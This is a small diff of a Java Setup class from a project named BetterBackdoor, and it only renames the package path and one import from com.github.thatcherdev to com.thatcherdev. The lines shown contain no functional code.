@@ -1,4 +1,4 @@
-package com.github.thatcherdev.betterbackdoor;
+package com.thatcherdev.betterbackdoor;
 
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -15,7 +15,7 @@ import java.nio.file.StandardOpenOption;
 import java.util.HashMap;
 import java.util.Map;
 import org.apache.commons.io.FileUtils;
-import com.github.thatcherdev.betterbackdoor.backend.Utils;
+import com.thatcherdev.betterbackdoor.backend.Utils;
 
 public class Setup {
 
